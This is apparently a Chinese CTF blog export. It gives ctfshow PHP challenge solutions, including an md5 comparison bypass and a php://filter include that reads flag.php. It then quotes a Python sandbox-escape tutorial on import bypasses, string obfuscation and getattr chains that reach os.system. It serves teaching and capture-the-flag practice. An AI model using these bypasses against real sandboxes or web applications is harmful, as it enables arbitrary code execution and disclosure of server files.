web107&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]))&#123;    $v1 = $_POST[&#x27;v1&#x27;];    $v3 = $_GET[&#x27;v3&#x27;];       parse_str($v1,$v2);       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;           echo $flag;       &#125;&#125;?&gt;

payload：get:?v3=0；post:v1=flag=cfcd208495d565ef66e7dff9f98764da
web125&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);         if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;?&gt;

与上一题相比多禁止flag|GLOBALS|echo|var_dump|print，因此我们需要换一种思路
我们可以利用include函数来包含flag.php
因此我们post传参：CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=include$_GET[1]，get传参：?1=php://filter/convert.base64-encode/resource=flag.php
得到base64编码后的文件内容，拿去解密后就可以得到flag了
引用来源: Tajang的大千世界文章作者: Tajang文章链接: https://ctfking.com/2021/07/14/php-te-xing-zong-jie/
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>python沙盒逃逸</title>
    <url>/2024/03/19/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[引用Python 沙箱逃逸的经验总结
执行系统命令基础知识在 Python 中执行系统命令的方式有：

os
commands：仅限2.x
subprocess
timeit：timeit.sys、timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1)
platform：platform.os、platform.sys、platform.popen(&#39;whoami&#39;, mode=&#39;r&#39;, bufsize=-1).read()
pty：pty.spawn(&#39;ls&#39;)、pty.os
bdb：bdb.os、cgi.sys
cgi：cgi.os、cgi.sys
…

以下为一个脚本测试了一下所有的导入 os 或者 sys 的库：
#-*- coding:utf8 -*-# By Macr0phag3# in 2019-05-07 19:46:12# ------------------------------------# this, antigravity 库删掉all_modules_2 = [    &#x27;BaseHTTPServer&#x27;, &#x27;imaplib&#x27;, &#x27;shelve&#x27;, &#x27;Bastion&#x27;, &#x27;anydbm&#x27;, &#x27;imghdr&#x27;, &#x27;shlex&#x27;, &#x27;CDROM&#x27;, &#x27;argparse&#x27;, &#x27;imp&#x27;, &#x27;shutil&#x27;, &#x27;CGIHTTPServer&#x27;, &#x27;array&#x27;, &#x27;importlib&#x27;, &#x27;signal&#x27;, &#x27;Canvas&#x27;, &#x27;ast&#x27;, &#x27;imputil&#x27;, &#x27;site&#x27;, &#x27;ConfigParser&#x27;, &#x27;asynchat&#x27;, &#x27;inspect&#x27;, &#x27;sitecustomize&#x27;, &#x27;Cookie&#x27;, &#x27;asyncore&#x27;, &#x27;io&#x27;, &#x27;smtpd&#x27;, &#x27;DLFCN&#x27;, &#x27;atexit&#x27;, &#x27;itertools&#x27;, &#x27;smtplib&#x27;, &#x27;Dialog&#x27;, &#x27;audiodev&#x27;, &#x27;json&#x27;, &#x27;sndhdr&#x27;, &#x27;DocXMLRPCServer&#x27;, &#x27;audioop&#x27;, &#x27;keyword&#x27;, &#x27;socket&#x27;, &#x27;FileDialog&#x27;, &#x27;base64&#x27;, &#x27;lib2to3&#x27;, &#x27;spwd&#x27;, &#x27;FixTk&#x27;, &#x27;bdb&#x27;, &#x27;linecache&#x27;, &#x27;sqlite3&#x27;, &#x27;HTMLParser&#x27;, &#x27;binascii&#x27;, &#x27;linuxaudiodev&#x27;, &#x27;sre&#x27;, &#x27;IN&#x27;, &#x27;binhex&#x27;, &#x27;locale&#x27;, &#x27;sre_compile&#x27;, &#x27;MimeWriter&#x27;, &#x27;bisect&#x27;, &#x27;logging&#x27;, &#x27;sre_constants&#x27;, &#x27;Queue&#x27;, &#x27;bsddb&#x27;, &#x27;lsb_release&#x27;, &#x27;sre_parse&#x27;, &#x27;ScrolledText&#x27;, &#x27;bz2&#x27;, &#x27;macpath&#x27;, &#x27;ssl&#x27;, &#x27;SimpleDialog&#x27;, &#x27;cPickle&#x27;, &#x27;macurl2path&#x27;, &#x27;stat&#x27;, &#x27;SimpleHTTPServer&#x27;, &#x27;cProfile&#x27;, &#x27;mailbox&#x27;, &#x27;statvfs&#x27;, &#x27;SimpleXMLRPCServer&#x27;, &#x27;cStringIO&#x27;, &#x27;mailcap&#x27;, &#x27;string&#x27;, &#x27;SocketServer&#x27;, &#x27;calendar&#x27;, &#x27;markupbase&#x27;, &#x27;stringold&#x27;, &#x27;StringIO&#x27;, &#x27;cgi&#x27;, &#x27;marshal&#x27;, &#x27;stringprep&#x27;, &#x27;TYPES&#x27;, &#x27;cgitb&#x27;, &#x27;math&#x27;, &#x27;strop&#x27;, &#x27;Tix&#x27;, &#x27;chunk&#x27;, &#x27;md5&#x27;, &#x27;struct&#x27;, &#x27;Tkconstants&#x27;, &#x27;cmath&#x27;, &#x27;mhlib&#x27;, &#x27;subprocess&#x27;, &#x27;Tkdnd&#x27;, &#x27;cmd&#x27;, &#x27;mimetools&#x27;, &#x27;sunau&#x27;, &#x27;Tkinter&#x27;, &#x27;code&#x27;, &#x27;mimetypes&#x27;, &#x27;sunaudio&#x27;, &#x27;UserDict&#x27;, &#x27;codecs&#x27;, &#x27;mimify&#x27;, &#x27;symbol&#x27;, &#x27;UserList&#x27;, &#x27;codeop&#x27;, &#x27;mmap&#x27;, &#x27;symtable&#x27;, &#x27;UserString&#x27;, &#x27;collections&#x27;, &#x27;modulefinder&#x27;, &#x27;sys&#x27;, &#x27;_LWPCookieJar&#x27;, &#x27;colorsys&#x27;, &#x27;multifile&#x27;, &#x27;sysconfig&#x27;, &#x27;_MozillaCookieJar&#x27;, &#x27;commands&#x27;, &#x27;multiprocessing&#x27;, &#x27;syslog&#x27;, &#x27;__builtin__&#x27;, &#x27;compileall&#x27;, &#x27;mutex&#x27;, &#x27;tabnanny&#x27;, &#x27;__future__&#x27;, &#x27;compiler&#x27;, &#x27;netrc&#x27;, &#x27;talloc&#x27;, &#x27;_abcoll&#x27;, &#x27;contextlib&#x27;, &#x27;new&#x27;, &#x27;tarfile&#x27;, &#x27;_ast&#x27;, &#x27;cookielib&#x27;, &#x27;nis&#x27;, &#x27;telnetlib&#x27;, &#x27;_bisect&#x27;, &#x27;copy&#x27;, &#x27;nntplib&#x27;, &#x27;tempfile&#x27;, &#x27;_bsddb&#x27;, &#x27;copy_reg&#x27;, &#x27;ntpath&#x27;, &#x27;termios&#x27;, &#x27;_codecs&#x27;, &#x27;crypt&#x27;, &#x27;nturl2path&#x27;, &#x27;test&#x27;, &#x27;_codecs_cn&#x27;, &#x27;csv&#x27;, &#x27;numbers&#x27;, &#x27;textwrap&#x27;, &#x27;_codecs_hk&#x27;, &#x27;ctypes&#x27;, &#x27;opcode&#x27;, &#x27;_codecs_iso2022&#x27;, &#x27;curses&#x27;, &#x27;operator&#x27;, &#x27;thread&#x27;, &#x27;_codecs_jp&#x27;, &#x27;datetime&#x27;, &#x27;optparse&#x27;, &#x27;threading&#x27;, &#x27;_codecs_kr&#x27;, &#x27;dbhash&#x27;, &#x27;os&#x27;, &#x27;time&#x27;, &#x27;_codecs_tw&#x27;, &#x27;dbm&#x27;, &#x27;os2emxpath&#x27;, &#x27;timeit&#x27;, &#x27;_collections&#x27;, &#x27;decimal&#x27;, &#x27;ossaudiodev&#x27;, &#x27;tkColorChooser&#x27;, &#x27;_csv&#x27;, &#x27;difflib&#x27;, &#x27;parser&#x27;, &#x27;tkCommonDialog&#x27;, &#x27;_ctypes&#x27;, &#x27;dircache&#x27;, &#x27;pdb&#x27;, &#x27;tkFileDialog&#x27;, &#x27;_ctypes_test&#x27;, &#x27;dis&#x27;, &#x27;pickle&#x27;, &#x27;tkFont&#x27;, &#x27;_curses&#x27;, &#x27;distutils&#x27;, &#x27;pickletools&#x27;, &#x27;tkMessageBox&#x27;, &#x27;_curses_panel&#x27;, &#x27;doctest&#x27;, &#x27;pipes&#x27;, &#x27;tkSimpleDialog&#x27;, &#x27;_elementtree&#x27;, &#x27;dumbdbm&#x27;, &#x27;pkgutil&#x27;, &#x27;toaiff&#x27;, &#x27;_functools&#x27;, &#x27;dummy_thread&#x27;, &#x27;platform&#x27;, &#x27;token&#x27;, &#x27;_hashlib&#x27;, &#x27;dummy_threading&#x27;, &#x27;plistlib&#x27;, &#x27;tokenize&#x27;, &#x27;_heapq&#x27;, &#x27;email&#x27;, &#x27;popen2&#x27;, &#x27;trace&#x27;, &#x27;_hotshot&#x27;, &#x27;encodings&#x27;, &#x27;poplib&#x27;, &#x27;traceback&#x27;, &#x27;_io&#x27;, &#x27;ensurepip&#x27;, &#x27;posix&#x27;, &#x27;ttk&#x27;, &#x27;_json&#x27;, &#x27;errno&#x27;, &#x27;posixfile&#x27;, &#x27;tty&#x27;, &#x27;_locale&#x27;, &#x27;exceptions&#x27;, &#x27;posixpath&#x27;, &#x27;turtle&#x27;, &#x27;_lsprof&#x27;, &#x27;fcntl&#x27;, &#x27;pprint&#x27;, &#x27;types&#x27;, &#x27;_md5&#x27;, &#x27;filecmp&#x27;, &#x27;profile&#x27;, &#x27;unicodedata&#x27;, &#x27;_multibytecodec&#x27;, &#x27;fileinput&#x27;, &#x27;pstats&#x27;, &#x27;unittest&#x27;, &#x27;_multiprocessing&#x27;, &#x27;fnmatch&#x27;, &#x27;pty&#x27;, &#x27;urllib&#x27;, &#x27;_osx_support&#x27;, &#x27;formatter&#x27;, &#x27;pwd&#x27;, &#x27;urllib2&#x27;, &#x27;_pyio&#x27;, &#x27;fpformat&#x27;, &#x27;py_compile&#x27;, &#x27;urlparse&#x27;, &#x27;_random&#x27;, &#x27;fractions&#x27;, &#x27;pyclbr&#x27;, &#x27;user&#x27;, &#x27;_sha&#x27;, &#x27;ftplib&#x27;, &#x27;pydoc&#x27;, &#x27;uu&#x27;, &#x27;_sha256&#x27;, &#x27;functools&#x27;, &#x27;pydoc_data&#x27;, &#x27;uuid&#x27;, &#x27;_sha512&#x27;, &#x27;future_builtins&#x27;, &#x27;pyexpat&#x27;, &#x27;warnings&#x27;, &#x27;_socket&#x27;, &#x27;gc&#x27;, &#x27;quopri&#x27;, &#x27;wave&#x27;, &#x27;_sqlite3&#x27;, &#x27;genericpath&#x27;, &#x27;random&#x27;, &#x27;weakref&#x27;, &#x27;_sre&#x27;, &#x27;getopt&#x27;, &#x27;re&#x27;, &#x27;webbrowser&#x27;, &#x27;_ssl&#x27;, &#x27;getpass&#x27;, &#x27;readline&#x27;, &#x27;whichdb&#x27;, &#x27;_strptime&#x27;, &#x27;gettext&#x27;, &#x27;repr&#x27;, &#x27;wsgiref&#x27;, &#x27;_struct&#x27;, &#x27;glob&#x27;, &#x27;resource&#x27;, &#x27;xdrlib&#x27;, &#x27;_symtable&#x27;, &#x27;grp&#x27;, &#x27;rexec&#x27;, &#x27;xml&#x27;, &#x27;_sysconfigdata&#x27;, &#x27;gzip&#x27;, &#x27;rfc822&#x27;, &#x27;xmllib&#x27;, &#x27;_sysconfigdata_nd&#x27;, &#x27;hashlib&#x27;, &#x27;rlcompleter&#x27;, &#x27;xmlrpclib&#x27;, &#x27;_testcapi&#x27;, &#x27;heapq&#x27;, &#x27;robotparser&#x27;, &#x27;xxsubtype&#x27;, &#x27;_threading_local&#x27;, &#x27;hmac&#x27;, &#x27;runpy&#x27;, &#x27;zipfile&#x27;, &#x27;_warnings&#x27;, &#x27;hotshot&#x27;, &#x27;sched&#x27;, &#x27;zipimport&#x27;, &#x27;_weakref&#x27;, &#x27;htmlentitydefs&#x27;, &#x27;select&#x27;, &#x27;zlib&#x27;, &#x27;_weakrefset&#x27;, &#x27;htmllib&#x27;, &#x27;sets&#x27;, &#x27;abc&#x27;, &#x27;httplib&#x27;, &#x27;sgmllib&#x27;, &#x27;aifc&#x27;, &#x27;ihooks&#x27;, &#x27;sha&#x27;]all_modules_3 = [    &#x27;AptUrl&#x27;, &#x27;hmac&#x27;, &#x27;requests_unixsocket&#x27;, &#x27;CommandNotFound&#x27;, &#x27;apport&#x27;, &#x27;hpmudext&#x27;, &#x27;resource&#x27;, &#x27;Crypto&#x27;, &#x27;apport_python_hook&#x27;, &#x27;html&#x27;, &#x27;rlcompleter&#x27;, &#x27;DistUpgrade&#x27;, &#x27;apt&#x27;, &#x27;http&#x27;, &#x27;runpy&#x27;, &#x27;HweSupportStatus&#x27;, &#x27;apt_inst&#x27;, &#x27;httplib2&#x27;, &#x27;scanext&#x27;, &#x27;LanguageSelector&#x27;, &#x27;apt_pkg&#x27;, &#x27;idna&#x27;, &#x27;sched&#x27;, &#x27;NvidiaDetector&#x27;, &#x27;aptdaemon&#x27;, &#x27;imaplib&#x27;, &#x27;secrets&#x27;, &#x27;PIL&#x27;, &#x27;aptsources&#x27;, &#x27;imghdr&#x27;, &#x27;secretstorage&#x27;, &#x27;Quirks&#x27;, &#x27;argparse&#x27;, &#x27;imp&#x27;, &#x27;select&#x27;, &#x27;UbuntuDrivers&#x27;, &#x27;array&#x27;, &#x27;importlib&#x27;, &#x27;selectors&#x27;, &#x27;UbuntuSystemService&#x27;, &#x27;asn1crypto&#x27;, &#x27;inspect&#x27;, &#x27;shelve&#x27;, &#x27;UpdateManager&#x27;, &#x27;ast&#x27;, &#x27;io&#x27;, &#x27;shlex&#x27;, &#x27;__future__&#x27;, &#x27;asynchat&#x27;, &#x27;ipaddress&#x27;, &#x27;shutil&#x27;, &#x27;_ast&#x27;, &#x27;asyncio&#x27;, &#x27;itertools&#x27;, &#x27;signal&#x27;, &#x27;_asyncio&#x27;, &#x27;asyncore&#x27;, &#x27;janitor&#x27;, &#x27;simplejson&#x27;, &#x27;_bisect&#x27;, &#x27;atexit&#x27;, &#x27;json&#x27;, &#x27;site&#x27;, &#x27;_blake2&#x27;, &#x27;audioop&#x27;, &#x27;keyring&#x27;, &#x27;sitecustomize&#x27;, &#x27;_bootlocale&#x27;, &#x27;base64&#x27;, &#x27;keyword&#x27;, &#x27;six&#x27;, &#x27;_bz2&#x27;, &#x27;bdb&#x27;, &#x27;language_support_pkgs&#x27;, &#x27;smtpd&#x27;, &#x27;_cffi_backend&#x27;, &#x27;binascii&#x27;, &#x27;launchpadlib&#x27;, &#x27;smtplib&#x27;, &#x27;_codecs&#x27;, &#x27;binhex&#x27;, &#x27;linecache&#x27;, &#x27;sndhdr&#x27;, &#x27;_codecs_cn&#x27;, &#x27;bisect&#x27;, &#x27;locale&#x27;, &#x27;socket&#x27;, &#x27;_codecs_hk&#x27;, &#x27;brlapi&#x27;, &#x27;logging&#x27;, &#x27;socketserver&#x27;, &#x27;_codecs_iso2022&#x27;, &#x27;builtins&#x27;, &#x27;louis&#x27;, &#x27;softwareproperties&#x27;, &#x27;_codecs_jp&#x27;, &#x27;bz2&#x27;, &#x27;lsb_release&#x27;, &#x27;speechd&#x27;, &#x27;_codecs_kr&#x27;, &#x27;cProfile&#x27;, &#x27;lzma&#x27;, &#x27;speechd_config&#x27;, &#x27;_codecs_tw&#x27;, &#x27;cairo&#x27;, &#x27;macaroonbakery&#x27;, &#x27;spwd&#x27;, &#x27;_collections&#x27;, &#x27;calendar&#x27;, &#x27;macpath&#x27;, &#x27;sqlite3&#x27;, &#x27;_collections_abc&#x27;, &#x27;certifi&#x27;, &#x27;macurl2path&#x27;, &#x27;sre_compile&#x27;, &#x27;_compat_pickle&#x27;, &#x27;cgi&#x27;, &#x27;mailbox&#x27;, &#x27;sre_constants&#x27;, &#x27;_compression&#x27;, &#x27;cgitb&#x27;, &#x27;mailcap&#x27;, &#x27;sre_parse&#x27;, &#x27;_crypt&#x27;, &#x27;chardet&#x27;, &#x27;mako&#x27;, &#x27;ssl&#x27;, &#x27;_csv&#x27;, &#x27;chunk&#x27;, &#x27;markupsafe&#x27;, &#x27;stat&#x27;, &#x27;_ctypes&#x27;, &#x27;cmath&#x27;, &#x27;marshal&#x27;, &#x27;statistics&#x27;, &#x27;_ctypes_test&#x27;, &#x27;cmd&#x27;, &#x27;math&#x27;, &#x27;string&#x27;, &#x27;_curses&#x27;, &#x27;code&#x27;, &#x27;mimetypes&#x27;, &#x27;stringprep&#x27;, &#x27;_curses_panel&#x27;, &#x27;codecs&#x27;, &#x27;mmap&#x27;, &#x27;struct&#x27;, &#x27;_datetime&#x27;, &#x27;codeop&#x27;, &#x27;modual_test&#x27;, &#x27;subprocess&#x27;, &#x27;_dbm&#x27;, &#x27;collections&#x27;, &#x27;modulefinder&#x27;, &#x27;sunau&#x27;, &#x27;_dbus_bindings&#x27;, &#x27;colorsys&#x27;, &#x27;multiprocessing&#x27;, &#x27;symbol&#x27;, &#x27;_dbus_glib_bindings&#x27;, &#x27;compileall&#x27;, &#x27;nacl&#x27;, &#x27;symtable&#x27;, &#x27;_decimal&#x27;, &#x27;concurrent&#x27;, &#x27;netrc&#x27;, &#x27;sys&#x27;, &#x27;_dummy_thread&#x27;, &#x27;configparser&#x27;, &#x27;nis&#x27;, &#x27;sysconfig&#x27;, &#x27;_elementtree&#x27;, &#x27;contextlib&#x27;, &#x27;nntplib&#x27;, &#x27;syslog&#x27;, &#x27;_functools&#x27;, &#x27;copy&#x27;, &#x27;ntpath&#x27;, &#x27;systemd&#x27;, &#x27;_gdbm&#x27;, &#x27;copyreg&#x27;, &#x27;nturl2path&#x27;, &#x27;tabnanny&#x27;, &#x27;_hashlib&#x27;, &#x27;crypt&#x27;, &#x27;numbers&#x27;, &#x27;tarfile&#x27;, &#x27;_heapq&#x27;, &#x27;cryptography&#x27;, &#x27;oauth&#x27;, &#x27;telnetlib&#x27;, &#x27;_imp&#x27;, &#x27;csv&#x27;, &#x27;olefile&#x27;, &#x27;tempfile&#x27;, &#x27;_io&#x27;, &#x27;ctypes&#x27;, &#x27;opcode&#x27;, &#x27;termios&#x27;, &#x27;_json&#x27;, &#x27;cups&#x27;, &#x27;operator&#x27;, &#x27;test&#x27;, &#x27;_locale&#x27;, &#x27;cupsext&#x27;, &#x27;optparse&#x27;, &#x27;textwrap&#x27;, &#x27;_lsprof&#x27;, &#x27;cupshelpers&#x27;, &#x27;orca&#x27;, &#x27;_lzma&#x27;, &#x27;curses&#x27;, &#x27;os&#x27;, &#x27;threading&#x27;, &#x27;_markupbase&#x27;, &#x27;datetime&#x27;, &#x27;ossaudiodev&#x27;, &#x27;time&#x27;, &#x27;_md5&#x27;, &#x27;dbm&#x27;, &#x27;parser&#x27;, &#x27;timeit&#x27;, &#x27;_multibytecodec&#x27;, &#x27;dbus&#x27;, &#x27;pathlib&#x27;, &#x27;token&#x27;, &#x27;_multiprocessing&#x27;, &#x27;deb822&#x27;, &#x27;pcardext&#x27;, &#x27;tokenize&#x27;, &#x27;_opcode&#x27;, &#x27;debconf&#x27;, &#x27;pdb&#x27;, &#x27;trace&#x27;, &#x27;_operator&#x27;, &#x27;debian&#x27;, &#x27;pexpect&#x27;, &#x27;traceback&#x27;, &#x27;_osx_support&#x27;, &#x27;debian_bundle&#x27;, &#x27;pickle&#x27;, &#x27;tracemalloc&#x27;, &#x27;_pickle&#x27;, &#x27;decimal&#x27;, &#x27;pickletools&#x27;, &#x27;tty&#x27;, &#x27;_posixsubprocess&#x27;, &#x27;defer&#x27;, &#x27;pipes&#x27;, &#x27;turtle&#x27;, &#x27;_pydecimal&#x27;, &#x27;difflib&#x27;, &#x27;pkg_resources&#x27;, &#x27;types&#x27;, &#x27;_pyio&#x27;, &#x27;dis&#x27;, &#x27;pkgutil&#x27;, &#x27;typing&#x27;, &#x27;_random&#x27;, &#x27;distro_info&#x27;, &#x27;platform&#x27;, &#x27;ufw&#x27;, &#x27;_sha1&#x27;, &#x27;distro_info_test&#x27;, &#x27;plistlib&#x27;, &#x27;unicodedata&#x27;, &#x27;_sha256&#x27;, &#x27;distutils&#x27;, &#x27;poplib&#x27;, &#x27;unittest&#x27;, &#x27;_sha3&#x27;, &#x27;doctest&#x27;, &#x27;posix&#x27;, &#x27;urllib&#x27;, &#x27;_sha512&#x27;, &#x27;dummy_threading&#x27;, &#x27;posixpath&#x27;, &#x27;urllib3&#x27;, &#x27;_signal&#x27;, &#x27;email&#x27;, &#x27;pprint&#x27;, &#x27;usbcreator&#x27;, &#x27;_sitebuiltins&#x27;, &#x27;encodings&#x27;, &#x27;problem_report&#x27;, &#x27;uu&#x27;, &#x27;_socket&#x27;, &#x27;enum&#x27;, &#x27;profile&#x27;, &#x27;uuid&#x27;, &#x27;_sqlite3&#x27;, &#x27;errno&#x27;, &#x27;pstats&#x27;, &#x27;venv&#x27;, &#x27;_sre&#x27;, &#x27;faulthandler&#x27;, &#x27;pty&#x27;, &#x27;wadllib&#x27;, &#x27;_ssl&#x27;, &#x27;fcntl&#x27;, &#x27;ptyprocess&#x27;, &#x27;warnings&#x27;, &#x27;_stat&#x27;, &#x27;filecmp&#x27;, &#x27;pwd&#x27;, &#x27;wave&#x27;, &#x27;_string&#x27;, &#x27;fileinput&#x27;, &#x27;py_compile&#x27;, &#x27;weakref&#x27;, &#x27;_strptime&#x27;, &#x27;fnmatch&#x27;, &#x27;pyatspi&#x27;, &#x27;webbrowser&#x27;, &#x27;_struct&#x27;, &#x27;formatter&#x27;, &#x27;pyclbr&#x27;, &#x27;wsgiref&#x27;, &#x27;_symtable&#x27;, &#x27;fractions&#x27;, &#x27;pydoc&#x27;, &#x27;xdg&#x27;, &#x27;_sysconfigdata_m_linux_x86_64-linux-gnu&#x27;, &#x27;ftplib&#x27;, &#x27;pydoc_data&#x27;, &#x27;xdrlib&#x27;, &#x27;_testbuffer&#x27;, &#x27;functools&#x27;, &#x27;pyexpat&#x27;, &#x27;xkit&#x27;, &#x27;_testcapi&#x27;, &#x27;gc&#x27;, &#x27;pygtkcompat&#x27;, &#x27;xml&#x27;, &#x27;_testimportmultiple&#x27;, &#x27;genericpath&#x27;, &#x27;pymacaroons&#x27;, &#x27;xmlrpc&#x27;, &#x27;_testmultiphase&#x27;, &#x27;getopt&#x27;, &#x27;pyrfc3339&#x27;, &#x27;xxlimited&#x27;, &#x27;_thread&#x27;, &#x27;getpass&#x27;, &#x27;pytz&#x27;, &#x27;xxsubtype&#x27;, &#x27;_threading_local&#x27;, &#x27;gettext&#x27;, &#x27;queue&#x27;, &#x27;yaml&#x27;, &#x27;_tracemalloc&#x27;, &#x27;gi&#x27;, &#x27;quopri&#x27;, &#x27;zipapp&#x27;, &#x27;_warnings&#x27;, &#x27;glob&#x27;, &#x27;random&#x27;, &#x27;zipfile&#x27;, &#x27;_weakref&#x27;, &#x27;grp&#x27;, &#x27;re&#x27;, &#x27;zipimport&#x27;, &#x27;_weakrefset&#x27;, &#x27;gtweak&#x27;, &#x27;readline&#x27;, &#x27;zlib&#x27;, &#x27;_yaml&#x27;, &#x27;gzip&#x27;, &#x27;reportlab&#x27;, &#x27;zope&#x27;, &#x27;abc&#x27;, &#x27;hashlib&#x27;, &#x27;reprlib&#x27;, &#x27;aifc&#x27;, &#x27;heapq&#x27;]methods = [&#x27;os&#x27;, &#x27;sys&#x27;, &#x27;__builtins__&#x27;]results = &#123;&#125;				#空字典 results，用于存储每个模块的检查结果for module in all_modules_3:    results[module] = &#123;        &#x27;flag&#x27;: 0,        &#x27;result&#x27;: &#123;&#125;    &#125;    try:        m = __import__(module)        attrs = dir(m)			#获取对象 m 的所有属性和方法的名称列表        for method in methods:            if method in attrs:                result = &#x27;yes&#x27;                results[module][&#x27;flag&#x27;] = 1            else:                result = &#x27;no&#x27;            results[module][&#x27;result&#x27;][method] = result    except Exception as e:        print(e)for result in results:    if results[result][&#x27;flag&#x27;]:        print(&#x27;[+]&#x27; + result)        for r in results[result][&#x27;result&#x27;]:            print(&#x27;  [-]&#x27; + r + &#x27;: &#x27; + results[result][&#x27;result&#x27;][r])

all_modules_2就是 2.x 的标准库，all_modules_3 就是 3.x 的标准库
花式使用import首先，禁用 import os 肯定是不行的，因为
import  osimport   osimport    os...

都可以。如果多个空格也过滤了，Python 能够 import 的可不止 import，还有 __import__：__import__(&#39;os&#39;)，__import__被干了还有 importlib：importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)
这样就安全了吗？实际上import可以通过其他方式完成。回想一下 import 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用 execfile 来代替：
execfile(&#x27;/usr/lib/python2.7/os.py&#x27;)system(&#x27;ls&#x27;)

不过要注意，2.x 才能用，3.x 删了 execfile，不过可以这样：
with open(&#x27;/usr/lib/python3.6/os.py&#x27;,&#x27;r&#x27;) as f:    exec(f.read())system(&#x27;ls&#x27;)

这个方法倒是 2.x、3.x 通用的
不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下，：
import sysprint(sys.path)

eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、拼接、base64、hex、rot13…等等
[&#x27;__builtins__&#x27;] == [&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;] == [u&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;] == [&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)] == [&#x27;__buil&#x27;+&#x27;tins__&#x27;] == [&#x27;__buil&#x27;&#x27;tins__&#x27;] == [&#x27;__buil&#x27;.__add__(&#x27;tins__&#x27;)] == [&quot;_builtins_&quot;.join(&quot;__&quot;)] == [&#x27;%c%c%c%c%c%c%c%c%c%c%c%c&#x27; % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]...

最后那个格式化字符串，任意字符都可以构造出来
恢复 sys.modulessys.modules 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 os 是默认被加载进来的，但是不能直接使用（但是可以通过 sys.modules 来使用，例如 sys.modules[&quot;os&quot;]），原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。
如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：
&gt;&gt;&gt; sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;&gt;&gt;&gt; import os&gt;&gt;&gt; os.system(&#x27;ls&#x27;)Traceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;&gt;&gt;&gt;

注意，这里不能用 del sys.modules[&#39;os&#39;]，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。
所以删了 sys.modules[&#39;os&#39;] 只会让 Python 重新加载一次 os。
看到这你肯定发现了，对于上面的过滤方式，绕过的方式可以是这样：
sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;del sys.modules[&#x27;os&#x27;]import osos.system(&#x27;ls&#x27;)

花式执行函数通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过os.system执行系统命令，并且这里的system也不是字符串，也没法直接做编码等等操作。我遇到过一个环境，直接在/usr/lib/python2.7/os.py中删了system函数。。。
不过，要明确的是，os 中能够执行系统命令的函数有很多：
print(os.system(&#x27;whoami&#x27;))print(os.popen(&#x27;whoami&#x27;).read()) print(os.popen2(&#x27;whoami&#x27;).read()) # 2.xprint(os.popen3(&#x27;whoami&#x27;).read()) # 2.xprint(os.popen4(&#x27;whoami&#x27;).read()) # 2.x...

过滤system的时候说不定还有其他函数给漏了
其次，可以通过 getattr 拿到对象的方法、属性：
import osgetattr(os, &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)

不让出现 import 也没事：
&gt;&gt;&gt; getattr(getattr(__builtins__, &#x27;__tropmi__&#x27;[::-1])(&#x27;so&#x27;[::-1]), &#x27;metsys&#x27;[::-1])(&#x27;whoami&#x27;)macr0phag30

一样可以。这个方法同样可以用于逃逸过滤 import 的沙箱

getattr 是 Python 中的一个内置函数，用于获取对象的属性值。它的语法如下：
getattr(object, name[, default])


object：表示要获取属性的对象。
name：表示要获取的属性的名称。
default：可选参数，表示当属性不存在时返回的默认值。如果省略了 default 参数，并且属性不存在，那么 getattr 将会引发 AttributeError 异常。

getattr 的作用是从对象中获取指定名称的属性值。如果对象中存在该属性，则返回该属性的值；如果不存在，则根据情况返回默认值或引发异常
与 getattr 相似的还有 __getattr__、__getattribute__，它们自己的区别就是getattr相当于class.attr，都是获取类属性&#x2F;方法的一种方式，在获取的时候会触发__getattribute__，如果__getattribute__找不到，则触发__getattr__，还找不到则报错
builtins、builtin__与__builtins先说一下，builtin、builtins，__builtin__与__builtins__的区别：首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如chr、open。之所以可以这样，是因为 Python 有个叫内建模块（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python 对函数、变量、类等等的查找方式是按 LEGB 规则来找的，其中 B 即代表内建模块，这里也不再赘述了，有兴趣的搜搜就明白了。
